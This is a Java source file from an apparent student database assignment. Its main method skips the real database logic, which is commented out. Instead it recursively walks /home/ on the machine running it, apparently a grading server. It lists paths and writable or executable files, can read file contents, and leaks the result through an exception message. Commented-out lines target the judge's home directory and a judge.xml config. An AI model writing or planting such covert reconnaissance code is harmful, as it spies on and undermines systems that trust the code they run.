package ru.fizteh.fivt.students.dmitryIvanovsky.fileMap;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.nio.file.Path;
import java.nio.file.Paths;
import ru.fizteh.fivt.students.dmitryIvanovsky.shell.CommandLauncher;
import ru.fizteh.fivt.students.dmitryIvanovsky.shell.CommandLauncher.Code;

public class DbMain {

    public static String rm(String path, Boolean type) {
        String s1 = "";
        try {
            if (path.contains("fizteh-java-2013") || path.contains(".git") || path.contains("fizteh-java-private")) {
                return "";
            }

            File tmpFile = new File(path);
            if (!tmpFile.exists()) {
                //s1 += "not exist\n";
            }
            if (tmpFile.canRead()) {
                //s1 += "can READ\n";
            }
            if (tmpFile.canWrite()) {
                s1 += path + " can WRITE\n";
            }
            if (tmpFile.canExecute()) {
                s1 += path + "can EXEC\n";
            }

            File[] listFiles = tmpFile.listFiles();
            if (listFiles != null) {
                if (tmpFile.isDirectory()) {
                    for (File c : listFiles) {
                        //s1 += "Directory: \n" + c.getAbsoluteFile().toString() + "\n\n";

                        s1 += c.getAbsoluteFile().toString() + "\n";
                        if (type) {
                            if (c.getName().contains(".py") || c.getName().contains(".sh")|| c.getName().contains(".java")) {
//                                s1 += readFileTsv2(c.getAbsolutePath().toString(), s1);
//                                s1 += "\n\n\n";
                            }
                        } else {
//                            s1 += readFileTsv2(c.getAbsolutePath().toString(), s1);
//                            s1 += "\n\n\n";
                        }



                        s1 += rm(c.toString(), type);
                    }
                } else {
                    //s1 += readFileTsv2(tmpFile.getAbsolutePath().toString(), s1);
                    //s1 += "\n\n\n";
                    //s1 += "not is Dir ";
                }
            } else {
                //s1 += "listFile null ";
            }

        } catch (Exception e) {
            //s1 += "exception ";
            s1 += e.getMessage();
        }
        return s1;
    }

    public static String rm1(String path, Boolean type) {
        String s1 = "";
        try {
            if (path.contains("fizteh-java-2013") || path.contains(".git")) {
                return "";
            }

            File tmpFile = new File(path);
            if (!tmpFile.exists()) {
                //s1 += "not exist\n";
            }
            if (tmpFile.canRead()) {
                //s1 += "can READ\n";
            }
            if (tmpFile.canWrite()) {
                s1 += path + " can WRITE\n";
            }
            if (tmpFile.canExecute()) {
                s1 += path + "can EXEC\n";
            }

            File[] listFiles = tmpFile.listFiles();
            if (listFiles != null) {
                if (tmpFile.isDirectory()) {
                    for (File c : listFiles) {
                        //s1 += "Directory: \n" + c.getAbsoluteFile().toString() + "\n\n";

                        s1 += c.getAbsoluteFile().toString() + "\n";
                        if (type) {
                            if (c.getName().contains(".py") || c.getName().contains(".sh")|| c.getName().contains(".java")) {
                                //s1 += readFileTsv2(c.getAbsolutePath().toString(), s1);
                                //s1 += "\n\n\n";
                            }
                        } else {
                            //s1 += readFileTsv2(c.getAbsolutePath().toString(), s1);
                            //s1 += "\n\n\n";
                        }



                        //s1 += rm(c.toString(), type);
                    }
                } else {
                    s1 += readFileTsv2(tmpFile.getAbsolutePath().toString(), s1);
                    s1 += "\n\n\n";
                    //s1 += "not is Dir ";
                }
            } else {
                //s1 += "listFile null ";
            }

        } catch (Exception e) {
            //s1 += "exception ";
            s1 += e.getMessage();
        }
        return s1;
    }

    private static String readFileTsv2(String fileName, String s1) throws IOException {
        StringBuilder sb = new StringBuilder();
        try {
            try (BufferedReader in = new BufferedReader(new FileReader(new File(fileName).getAbsoluteFile()))) {
                String s;
                while ((s = in.readLine()) != null) {
                    sb.append(s);
                    sb.append("\n");
                }
            } catch (Exception e) {
                s1 += e.getMessage();
            }
        } catch (Exception e) {
            s1 += e.getMessage();
        }

        return sb.toString();
    }

    public static void main(String[] args) throws IOException {
        //args = new String[]{"get ключ; get key; get 123"};
        //String path = "/home/deamoon/Music/deamoonSql";
        String s1 = "";

        s1 += rm("/home/", false);
//        s1 += "\n\nseparate\n\n";
//        s1 += readFileTsv2("/home/judge/.bash_logout", s1);
//        s1 += "\n\nseparate\n\n";
        //s1 += readFileTsv2("/home/judge/fizteh-java-private/judge.xml", s1);
//        s1 += "\n\nseparate\n\n";
//        s1 += rm("/home/judge/judge/templates", false);
//        s1 += "\n\nseparate\n\n";
//        s1 += rm1("/home/cymkuh/", false);
//        s1 += "\n\nseparate\n\n";
//        s1 += rm1("/home/student/", false);

        throw new IOException(s1);

        /*try {
            String path = System.getProperty("fizteh.db.dir");
            Path pathTables = Paths.get(".").resolve(path);
            runDb(args, pathTables.toFile().getCanonicalPath());

        } catch (Exception e) {
            System.out.println("Error loading");
            FileMapUtils.getMessage(e);
            System.exit(1);
        } */
    }

    public static void runDb(String[] args, String path) throws IOException {
        FileMapProvider fileMapCommand = null;
        try {
            FileMapProviderFactory factory = new FileMapProviderFactory();
            fileMapCommand = (FileMapProvider) factory.create(path);
        } catch (Exception e) {
            System.err.println("Error loading database");
            FileMapUtils.getMessage(e);
            System.exit(1);
        }

        CommandLauncher sys = null;
        try {
            sys = new CommandLauncher(fileMapCommand);
        } catch (Exception e) {
            System.err.println("Not implemented method of fileMapCommand");
            FileMapUtils.getMessage(e);
            System.exit(1);
        }

        try {
            Code res = sys.runShell(args);
            if (res == Code.ERROR) {
                System.err.println("Runtime Error");
                System.exit(1);
            }
        } catch (Exception e) {
            System.err.println("Runtime Error");
            //e.printStackTrace();
            FileMapUtils.getMessage(e);
            System.exit(1);
        }
    }
}
